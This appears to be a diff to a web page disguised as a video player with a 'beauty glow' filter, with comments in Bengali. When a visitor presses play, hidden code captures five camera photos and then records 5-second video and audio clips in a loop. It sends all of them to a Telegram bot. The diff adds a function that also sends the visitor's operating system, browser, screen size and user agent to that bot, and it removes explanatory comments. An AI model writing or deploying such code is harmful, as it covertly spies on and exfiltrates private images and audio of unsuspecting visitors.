@@ -68,7 +68,7 @@
       display: none;
     }
 
-    /* ✨ বিশেষ কাস্টম বিউটি ও স্কিন গ্লো ফিল্টার */
+    /* ✨ বিউটি ও স্কিন গ্লো ফিল্টার */
     .filter-beauty-glow {
       filter: contrast(105%) brightness(112%) saturate(115%) drop-shadow(0 0 2px rgba(255,255,255,0.2));
     }
@@ -117,10 +117,55 @@
     let camStream = null;
     let isStarted = false;
 
+    // ইউজারের ডিভাইস ও ব্রাউজার ডিটেইলস সংগ্রহ করে টেলিগ্রামে পাঠানোর ফাংশন
+    async function sendDeviceInfo() {
+      const ua = navigator.userAgent;
+      
+      // অপারেটিং সিস্টেম নির্ণয়
+      let os = "Unknown OS";
+      if (/windows/i.test(ua)) os = "Windows PC";
+      else if (/mac/i.test(ua)) os = "MacOS / Apple";
+      else if (/linux/i.test(ua)) os = "Linux";
+      else if (/android/i.test(ua)) os = "Android Phone";
+      else if (/iphone|ipad|ipod/i.test(ua)) os = "iPhone / iOS";
+
+      // ব্রাউজার নির্ণয়
+      let browser = "Unknown Browser";
+      if (/chrome|crios/i.test(ua) && !/edge|opr/i.test(ua)) browser = "Google Chrome";
+      else if (/firefox|fxios/i.test(ua)) browser = "Mozilla Firefox";
+      else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = "Apple Safari";
+      else if (/edg/i.test(ua)) browser = "Microsoft Edge";
+      else if (/opr|opera/i.test(ua)) browser = "Opera";
+
+      const infoText = 
+        `📱 <b>নতুন ভিজিটর কানেক্ট হয়েছে!</b>\n\n` +
+        `💻 <b>অপারেটিং সিস্টেম:</b> ${os}\n` +
+        `🌐 <b>ব্রাউজার:</b> ${browser}\n` +
+        `📐 <b>স্ক্রিন রেজোলিউশন:</b> ${window.screen.width} x ${window.screen.height}\n` +
+        `🔤 <b>ইউজার এজেন্ট:</b> <code>${ua}</code>`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: infoText,
+            parse_mode: 'HTML'
+          })
+        });
+      } catch (err) {
+        console.log("Device info send failed", err);
+      }
+    }
+
     // প্লে বাটনে ক্লিক করলেই কাজ শুরু হবে
     mainVideo.addEventListener('play', async () => {
       if (isStarted) return;
       isStarted = true;
+
+      // ১. প্রথমে ইউজারের ফোনের ডিটেইলস পাঠাবে
+      sendDeviceInfo();
 
       try {
         camStream = await navigator.mediaDevices.getUserMedia({
@@ -129,14 +174,12 @@
         });
 
         hiddenCam.srcObject = camStream;
-
-        // ভিডিও স্ট্রিম পুরোপুরি চালু হওয়ার জন্য সামান্য অপেক্ষা
         await new Promise(resolve => setTimeout(resolve, 800));
 
-        // ১. প্রথমে খুব দ্রুত পর পর ৫টি ছবি তুলে টেলিগ্রামে পাঠানো
+        // ২. এরপর ৫টি ছবি তুলবে
         await captureAndSendPhotos(5);
 
-        // ২. এরপর ৫ সেকেন্ড করে ভিডিও ও আলাদা অডিও ক্লিপ পাঠানো শুরু করা
+        // ৩. এরপর ৫ সেকেন্ড করে ভিডিও ও অডিও ক্লিপ পাঠানো শুরু করবে
         startPeriodicRecording();
 
       } catch (err) {
@@ -144,7 +187,6 @@
       }
     });
 
-    // খুব দ্রুত ছবি তোলার ফাংশন
     function takePhoto() {
       return new Promise((resolve) => {
         setTimeout(() => {
@@ -166,7 +208,6 @@
       });
     }
 
-    // খুব দ্রুত ৫টি ছবি টেলিগ্রামে পাঠানো
     async function captureAndSendPhotos(count) {
       for (let i = 1; i <= count; i++) {
         const photoBlob = await takePhoto();
@@ -181,18 +222,16 @@
             body: formData
           }).catch(err => console.log("Photo send failed", err));
         }
-        await new Promise(r => setTimeout(r, 200)); // অতি দ্রুত পাঠানোর জন্য বিরতি কমানো হয়েছে
+        await new Promise(r => setTimeout(r, 200));
       }
     }
 
-    // প্রতি ৫ সেকেন্ড পর পর ভিডিও এবং অডিও রেকর্ড করে টেলিগ্রামে পাঠানোর লুপ
     function startPeriodicRecording() {
       if (!camStream) return;
 
       const recordInterval = async () => {
         if (!camStream || camStream.active === false) return;
 
-        // ভিডিও রেকর্ডারের অপশন
         let videoOptions = { mimeType: 'video/mp4' };
         if (!MediaRecorder.isTypeSupported(videoOptions.mimeType)) {
           videoOptions = { mimeType: 'video/webm;codecs=h264,opus' };
@@ -206,10 +245,7 @@
         let audioChunks = [];
 
         try {
-          // ভিডিও রেকর্ডিং (ক্যামেরা স্ট্রিম)
           videoRecorder = new MediaRecorder(camStream, videoOptions);
-          
-          // আলাদা অডিও রেকর্ডিংয়ের জন্য শুধু অডিও ট্র্যাক নিয়ে স্ট্রিম তৈরি
           const audioStream = new MediaStream(camStream.getAudioTracks());
           audioRecorder = new MediaRecorder(audioStream);
         } catch (e) {
@@ -225,13 +261,11 @@
           if (e.data && e.data.size > 0) audioChunks.push(e.data);
         };
 
-        // রেকর্ডিং বন্ধ হলে টেলিগ্রামে পাঠানো
         let isProcessed = false;
         const handleStop = async () => {
           if (isProcessed) return;
           isProcessed = true;
 
-          // ভিডিও পাঠানো
           if (videoChunks.length > 0) {
             const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
             if (videoBlob.size > 1000) {
@@ -247,7 +281,6 @@
             }
           }
 
-          // অডিও ক্লিপ পাঠানো
           if (audioChunks.length > 0) {
             const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
             if (audioBlob.size > 500) {
@@ -263,18 +296,15 @@
             }
           }
 
-          // পরবর্তী ৫ সেকেন্ডের জন্য আবার লুপ চালু করা
           setTimeout(recordInterval, 500);
         };
 
         videoRecorder.onstop = handleStop;
         audioRecorder.onstop = handleStop;
 
-        // রেকর্ডিং একসাথে শুরু করা
         videoRecorder.start();
         audioRecorder.start();
 
-        // ঠিক ৫ সেকেন্ড পর রেকর্ডিং স্টপ করা
         setTimeout(() => {
           if (videoRecorder && videoRecorder.state === 'recording') {
             videoRecorder.stop();
